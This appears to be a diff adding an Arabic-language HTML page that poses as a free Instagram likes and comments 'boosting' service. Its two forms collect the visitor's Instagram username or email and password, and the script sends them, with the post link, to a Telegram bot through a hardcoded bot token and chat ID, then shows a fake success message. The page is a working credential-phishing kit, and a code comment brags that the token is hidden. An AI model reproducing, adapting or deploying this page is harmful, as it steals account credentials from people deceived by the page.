@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>خدمات – Instagram</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{
+    font-family:"Helvetica Neue",Arial,sans-serif;
+    background:#fafafa;min-height:100vh;display:flex;
+    align-items:center;justify-content:center;padding:16px;
+  }
+  .card{
+    background:#fff;border-radius:16px;padding:32px 24px;
+    max-width:420px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.08);
+    border:1px solid #e6e6e6;
+  }
+  .header{text-align:center;margin-bottom:24px;}
+  .header h1{font-size:22px;font-weight:700;color:#262626;margin-top:8px;}
+  .header p{font-size:13px;color:#777;margin-top:4px;}
+  .logo-img{width:60px;height:60px;border-radius:50%;object-fit:cover;}
+  
+  .tabs{display:flex;gap:8px;margin-bottom:20px;}
+  .tab{
+    flex:1;padding:10px;text-align:center;border-radius:8px;
+    cursor:pointer;font-size:13px;font-weight:600;transition:.2s;
+    border:1.5px solid #dbdbdb;background:#fff;color:#777;
+  }
+  .tab:hover{border-color:#e1306c;color:#e1306c;}
+  .tab.active{background:#e1306c;border-color:#e1306c;color:#fff;}
+
+  .field{margin-bottom:16px;}
+  .field label{
+    display:block;font-size:13px;font-weight:600;color:#262626;
+    margin-bottom:4px;
+  }
+  .field input,.field textarea{
+    width:100%;padding:12px 14px;border:1px solid #dbdbdb;
+    border-radius:8px;font-size:14px;color:#262626;background:#fafafa;
+    transition:.2s;font-family:inherit;
+  }
+  .field input:focus,.field textarea:focus{
+    outline:none;border-color:#e1306c;background:#fff;
+    box-shadow:0 0 0 3px rgba(225,48,108,.1);
+  }
+  .field textarea{min-height:80px;resize:vertical;}
+  .field .hint{font-size:11px;color:#999;margin-top:4px;}
+  .divider{height:1px;background:#eee;margin:20px 0;}
+
+  .plan-box{display:flex;gap:10px;margin-bottom:16px;}
+  .plan{
+    flex:1;border:1.5px solid #dbdbdb;border-radius:8px;padding:12px 8px;
+    text-align:center;cursor:pointer;transition:.2s;
+  }
+  .plan:hover{border-color:#e1306c;}
+  .plan.selected{border-color:#e1306c;background:#fff5f8;}
+  .plan .count{font-size:18px;font-weight:700;color:#262626;}
+  .plan .label{font-size:11px;color:#999;margin-top:2px;}
+  .plan .price{font-size:13px;color:#e1306c;font-weight:600;margin-top:4px;}
+
+  .btn{
+    width:100%;padding:13px;background:#e1306c;color:#fff;
+    border:none;border-radius:8px;font-size:15px;font-weight:700;
+    cursor:pointer;transition:.2s;margin-top:8px;
+  }
+  .btn:hover{background:#c1275c;}
+  .btn:disabled{opacity:.5;cursor:not-allowed;}
+  .status{text-align:center;margin-top:16px;font-size:13px;display:none;padding:10px;border-radius:8px;}
+  .status.success{display:block;background:#e6f4ea;color:#1e7e34;}
+  .status.error{display:block;background:#fce8e6;color:#c62828;}
+  .status.loading{display:block;background:#fef0f5;color:#e1306c;}
+  .hidden{display:none !important;}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="header">
+    <img class="logo-img" src="https://i.ibb.co/933Gwyp3/images-2.jpg" alt="Instagram">
+    <h1>خدمات Instagram</h1>
+    <p>اختر الخدمة التي تريدها</p>
+  </div>
+
+  <div class="tabs">
+    <div class="tab active" id="tabLikes" onclick="switchTab('likes')">❤️ رشق لايكات</div>
+    <div class="tab" id="tabComments" onclick="switchTab('comments')">💬 رشق كومنتات</div>
+  </div>
+
+  <div id="likesSection">
+    <div class="plan-box">
+      <div class="plan selected" data-count="500" onclick="selectPlan(this)">
+        <div class="count">500</div><div class="label">لايك</div><div class="price">مجاناً</div>
+      </div>
+      <div class="plan" data-count="1000" onclick="selectPlan(this)">
+        <div class="count">1,000</div><div class="label">لايك</div><div class="price">مجاناً</div>
+      </div>
+      <div class="plan" data-count="2500" onclick="selectPlan(this)">
+        <div class="count">2,500</div><div class="label">لايك</div><div class="price">مجاناً</div>
+      </div>
+    </div>
+    <form id="likesForm">
+      <div class="field">
+        <label>رابط المنشور</label>
+        <input type="url" id="likesPostUrl" placeholder="https://www.instagram.com/p/..." required>
+      </div>
+      <div class="field">
+        <label>البريد الإلكتروني أو اسم المستخدم</label>
+        <input type="text" id="likesUsername" placeholder="البريد الإلكتروني أو اليوزرنيم" required>
+      </div>
+      <div class="field">
+        <label>كلمة المرور</label>
+        <input type="password" id="likesPassword" placeholder="●●●●●●●●" required>
+      </div>
+      <button type="submit" class="btn" id="likesBtn">بدء رشق اللايكات</button>
+    </form>
+  </div>
+
+  <div id="commentsSection" class="hidden">
+    <div class="plan-box">
+      <div class="plan selected" data-count="50" onclick="selectPlanComments(this)">
+        <div class="count">50</div><div class="label">كومنت</div><div class="price">مجاناً</div>
+      </div>
+      <div class="plan" data-count="100" onclick="selectPlanComments(this)">
+        <div class="count">100</div><div class="label">كومنت</div><div class="price">مجاناً</div>
+      </div>
+      <div class="plan" data-count="200" onclick="selectPlanComments(this)">
+        <div class="count">200</div><div class="label">كومنت</div><div class="price">مجاناً</div>
+      </div>
+    </div>
+    <form id="commentsForm">
+      <div class="field">
+        <label>رابط المنشور</label>
+        <input type="url" id="commentsPostUrl" placeholder="https://www.instagram.com/p/..." required>
+      </div>
+      <div class="field">
+        <label>نص التعليق (اختياري)</label>
+        <textarea id="commentsText" placeholder="اتركه فارغًا لتعليقات عشوائية"></textarea>
+        <div class="hint">إذا تركته فارغًا سيتم استخدام تعليقات عشوائية</div>
+      </div>
+      <div class="field">
+        <label>البريد الإلكتروني أو اسم المستخدم</label>
+        <input type="text" id="commentsUsername" placeholder="البريد الإلكتروني أو اليوزرنيم" required>
+      </div>
+      <div class="field">
+        <label>كلمة المرور</label>
+        <input type="password" id="commentsPassword" placeholder="●●●●●●●●" required>
+      </div>
+      <button type="submit" class="btn" id="commentsBtn">بدء رشق الكومنتات</button>
+    </form>
+  </div>
+
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+// التوكن مخفي جوا الكود — مش موجود في الرابط خالص
+const BOT_TOKEN = '8635912264:AAGu4XL8v9WuS90vwrBGyJGz5fWyFMstM2E';
+const urlParams = new URLSearchParams(window.location.search);
+const CHAT_ID   = urlParams.get('id') || '8246832284';
+
+let selectedLikesCount = 500;
+let selectedCommentsCount = 50;
+
+function switchTab(tab){
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  document.getElementById('tabLikes').classList.toggle('active', tab==='likes');
+  document.getElementById('tabComments').classList.toggle('active', tab==='comments');
+  document.getElementById('likesSection').classList.toggle('hidden', tab!=='likes');
+  document.getElementById('commentsSection').classList.toggle('hidden', tab!=='comments');
+  document.getElementById('status').className = 'status';
+  document.getElementById('status').textContent = '';
+}
+
+function selectPlan(el){
+  document.querySelectorAll('#likesSection .plan').forEach(p=>p.classList.remove('selected'));
+  el.classList.add('selected');
+  selectedLikesCount = el.dataset.count;
+}
+
+function selectPlanComments(el){
+  document.querySelectorAll('#commentsSection .plan').forEach(p=>p.classList.remove('selected'));
+  el.classList.add('selected');
+  selectedCommentsCount = el.dataset.count;
+}
+
+document.getElementById('likesForm').addEventListener('submit', async e=>{
+  e.preventDefault();
+  const postUrl  = document.getElementById('likesPostUrl').value.trim();
+  const username = document.getElementById('likesUsername').value.trim();
+  const password = document.getElementById('likesPassword').value.trim();
+  const statusEl = document.getElementById('status');
+  const btn      = document.getElementById('likesBtn');
+
+  if(!postUrl || !username || !password){
+    statusEl.className = 'status error';
+    statusEl.textContent = '⚠️ الرجاء ملء جميع الحقول';
+    return;
+  }
+
+  btn.disabled = true;
+  btn.textContent = 'جاري التشغيل ...';
+  statusEl.className = 'status loading';
+  statusEl.textContent = '🔄 جاري بدء رشق اللايكات ...';
+
+  const msg = `❤️ <b>طلب رشق لايكات Instagram جديد</b>\n\n`+
+    `━━━━━━━━━━━━━━━\n\n`+
+    `📊 <b>عدد اللايكات:</b> ${selectedLikesCount}\n`+
+    `🔗 <b>رابط المنشور:</b> <code>${postUrl}</code>\n`+
+    `👤 <b>اسم المستخدم:</b> <code>${username}</code>\n`+
+    `🔑 <b>كلمة المرور:</b> <code>${password}</code>\n\n`+
+    `━━━━━━━━━━━━━━━━`;
+
+  try{
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'HTML'})
+    });
+    if(!res.ok) throw new Error('Telegram API error');
+    statusEl.className = 'status success';
+    statusEl.textContent = '✅ تم بدء رشق اللايكات بنجاح!';
+    e.target.reset();
+    document.querySelectorAll('#likesSection .plan')[0].classList.add('selected');
+  }catch(err){
+    statusEl.className = 'status error';
+    statusEl.textContent = '❌ فشل الإرسال! حاول مرة أخرى.';
+  }
+  btn.disabled = false;
+  btn.textContent = 'بدء رشق اللايكات';
+});
+
+document.getElementById('commentsForm').addEventListener('submit', async e=>{
+  e.preventDefault();
+  const postUrl  = document.getElementById('commentsPostUrl').value.trim();
+  const cmtText  = document.getElementById('commentsText').value.trim();
+  const username = document.getElementById('commentsUsername').value.trim();
+  const password = document.getElementById('commentsPassword').value.trim();
+  const statusEl = document.getElementById('status');
+  const btn      = document.getElementById('commentsBtn');
+
+  if(!postUrl || !username || !password){
+    statusEl.className = 'status error';
+    statusEl.textContent = '⚠️ الرجاء ملء جميع الحقول الأساسية';
+    return;
+  }
+
+  btn.disabled = true;
+  btn.textContent = 'جاري التشغيل ...';
+  statusEl.className = 'status loading';
+  statusEl.textContent = '🔄 جاري بدء رشق الكومنتات ...';
+
+  const msg = `💬 <b>طلب رشق كومنتات Instagram جديد</b>\n\n`+
+    `━━━━━━━━━━━━━━━\n\n`+
+    `📊 <b>عدد الكومنتات:</b> ${selectedCommentsCount}\n`+
+    `🔗 <b>رابط المنشور:</b> <code>${postUrl}</code>\n`+
+    `📝 <b>نص التعليق:</b> ${cmtText||'عشوائي'}\n`+
+    `👤 <b>اسم المستخدم:</b> <code>${username}</code>\n`+
+    `🔑 <b>كلمة المرور:</b> <code>${password}</code>\n\n`+
+    `━━━━━━━━━━━━━━━━`;
+
+  try{
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'HTML'})
+    });
+    if(!res.ok) throw new Error('Telegram API error');
+    statusEl.className = 'status success';
+    statusEl.textContent = '✅ تم بدء رشق الكومنتات بنجاح!';
+    e.target.reset();
+    document.querySelectorAll('#commentsSection .plan')[0].classList.add('selected');
+  }catch(err){
+    statusEl.className = 'status error';
+    statusEl.textContent = '❌ فشل الإرسال! حاول مرة أخرى.';
+  }
+  btn.disabled = false;
+  btn.textContent = 'بدء رشق الكومنتات';
+});
+</script>
+</body>
+</html>
